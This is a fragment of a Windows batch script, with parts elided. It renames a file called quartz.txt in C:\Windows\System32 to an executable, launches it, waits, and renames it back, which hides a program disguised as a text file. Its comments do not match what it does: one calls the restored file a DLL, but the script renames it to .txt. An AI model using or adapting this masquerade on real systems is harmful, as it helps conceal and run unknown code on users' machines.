...
if exist "C:\Windows\System32\tttt.exe" del /f /q "C:\Windows\System32\tttt.exe"
...
ren "C:\Windows\System32\quartz.txt" "tttt.exe"

:: Step 4: Execute
start "" "C:\Windows\System32\tttt.exe"

:: Step 5: Wait for 5 seconds
timeout /t 5 /nobreak >nul

:: Step 6: Rename EXE back to DLL
ren "C:\Windows\System32\tttt.exe" "quartz.txt"
